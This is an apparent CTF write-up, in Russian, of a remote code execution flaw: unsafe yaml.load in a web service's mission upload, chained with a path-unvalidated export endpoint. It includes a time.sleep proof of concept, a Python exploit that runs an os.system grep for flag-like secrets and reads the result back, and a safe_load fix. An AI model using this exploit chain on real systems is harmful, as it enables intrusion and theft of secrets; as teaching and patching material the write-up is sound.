# RCE в YAML десериалайзере

## как найти

`ruff check --select S app`

```bash
S506 Probable use of unsafe loader `Loader` with `yaml.load`. Allows instantiation of arbitrary objects. Consider `yaml.safe_load`.
   --> app/autopilot_web.py:711:36
    |
709 |         try:
710 |             text = body.decode("utf-8")
711 |             yaml.load(text, Loader=yaml.Loader)
    |                                    ^^^^^^^^^^^
712 |         except (UnicodeDecodeError, yaml.YAMLError, TypeError, ValueError):
713 |             raise HTTPException(
    |
```

## description

```python
@app.post("/api/mission")
async def upload_mission(request: Request) -> dict[str, bool]:
    body = await request.body()
    if len(body) > 65536:
        raise HTTPException(
            status_code=status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
            detail="mission too large",
        )
    try:
        text = body.decode("utf-8")
        yaml.load(text, Loader=yaml.Loader)
    except (UnicodeDecodeError, yaml.YAMLError, TypeError, ValueError):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="invalid mission",
        ) from None
    return {"accepted": True}
```


Вот эта функция хавала любой yaml и yaml.Loader вел к RCE. Для чтения выхлопа возможности нет, но есть LFI в чтении экспорта файла. вот тут:

```python
@app.get("/api/route/export")
def export_route(path: str) -> PlainTextResponse:
    try:
        value = app.state.store.read_export(path) # вот здесь просто чтение файла без валидации, LFI
    except StorageUnavailable:
        raise HTTPException(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
            detail="storage unavailable",
        ) from None
    if value is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="export not found",
        )
    return PlainTextResponse(value, media_type="text/plain")

```
```
```
```

## PoC

```
POST /api/mission HTTP/1.1
Host: localhost:8080
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Chromium";v="133", "Not(A:Brand";v="99"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8080/
Accept-Encoding: gzip, deflate, br
Cookie: csrftoken=2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4
Connection: keep-alive
Content-Length: 118


!!python/object/apply:time.sleep [5]
```

тут сервачок будет отдавать 5 секунд ответ
```
```

### sploit

```python
import requests

burp0_url = "http://localhost:8888/api/mission"
burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
burp0_headers = {
    "sec-ch-ua-platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "sec-ch-ua-mobile": "?0",
    "Accept": "*/*",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "http://localhost:8080/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}
# burp0 data изначально какой-то кал подставился, хз зачем это
burp0_data = """!!python/object/apply:os.system ['grep -E "[A-Z0-9]{31}=" -r /app 2>&1>/app/stores/autopilot/exports/rasput.file']"""
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


burp0_url = "http://localhost:8888/api/route/export?path=rasput.file"
burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
burp0_headers = {
    "sec-ch-ua-platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "sec-ch-ua-mobile": "?0",
    "Accept": "*/*",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "http://localhost:8080/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}
print(requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text)
```
```
```



### fix

```python
@app.post("/api/mission")
async def upload_mission(request: Request) -> dict[str, bool]:
    body = await request.body()
    if len(body) > 65536:
        raise HTTPException(
            status_code=status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
            detail="mission too large",
        )
    try:
        text = body.decode("utf-8")
        yaml.safe_load(text) # здесь замена на safe_load
    except (UnicodeDecodeError, yaml.YAMLError, TypeError, ValueError):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="invalid mission",
        ) from None
    return {"accepted": True}
```

